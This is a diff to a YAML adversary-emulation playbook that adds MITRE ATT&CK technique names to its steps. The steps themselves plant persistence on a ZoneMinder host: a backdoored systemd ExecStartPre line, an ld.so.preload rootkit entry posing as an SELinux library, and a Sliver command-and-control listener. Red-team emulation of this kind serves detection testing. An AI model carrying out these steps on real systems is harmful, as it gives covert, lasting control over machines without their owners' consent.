@@ -55,6 +55,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
   - type: shell
     cmd: sudo rm -rf $FATHERCHROOT/rootjail
@@ -70,8 +71,9 @@ commands:
     host: "0.0.0.0"
     port: "443"
     metadata:
-      techniques: "T1071,T1573"
+      techniques: "T1071.001,T1573"
       tactics: "Command and Control"
+      technique_name: "Application Layer Protocol: Web Protocols,Encrypted Channel"
 
   - type: shell
     cmd: ls $IMPLANTPATH
@@ -85,62 +87,70 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
    
   - type: ssh
     cmd: "vim /etc/systemd/system/multi-user.target.wants/zoneminder.service\n"
     interactive: True
     session: "root"
     metadata:
-      techniques: "T1543,T1569,T1037"    
+      techniques: "T1543.002,T1569,T1037"    
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service,System Services,Boot or Logon Initialization Scripts"
 
   - type: ssh
     cmd: ":inoremap jj <ESC>\n"
     interactive: True
     session: "root"
     metadata:
-      techniques: "T1543"  
+      techniques: "T1543.002"  
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     interactive: True
     cmd: "/[Service\n"
     session: "root"
     metadata:
-      techniques: "T1543"  
+      techniques: "T1543.002"  
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "o"
     interactive: True
     session: "root"
     metadata:
-      techniques: "T1543"  
+      techniques: "T1543.002"  
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ExecStartPre=sudo -g fax bash -c "/usr/bin/zmcontroller &"
     interactive: True
     session: "root"
     metadata:
-      techniques: "T1543,T1569"  
+      techniques: "T1543.002"  
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "jj"
     interactive: True
     session: "root"
     metadata:
-      techniques: "T1543"  
+      techniques: "T1543.002"  
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ":wq!\n"
     interactive: True
     session: "root"
     metadata:
-      techniques: "T1543"  
+      techniques: "T1543.002"  
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "echo /usr/lib/selinux.so.3 >> /etc/ld.so.preload"
@@ -148,20 +158,23 @@ commands:
     metadata:
       techniques: "T1014,T1564,T1574"  
       tactics: "Persistence"
+      technique_name: "Rootkit,Hide Artifacts,Hijack Execution Flow"
 
   - type: ssh
     cmd: systemctl daemon-reload
     session: root
     metadata:
-      techniques: "T1543" 
+      techniques: "T1543.002" 
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: systemctl restart zoneminder.service
     session: root
     metadata:
-      techniques: "T1543"  
+      techniques: "T1543.002"  
       tactics: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sliver-session
     cmd: ls
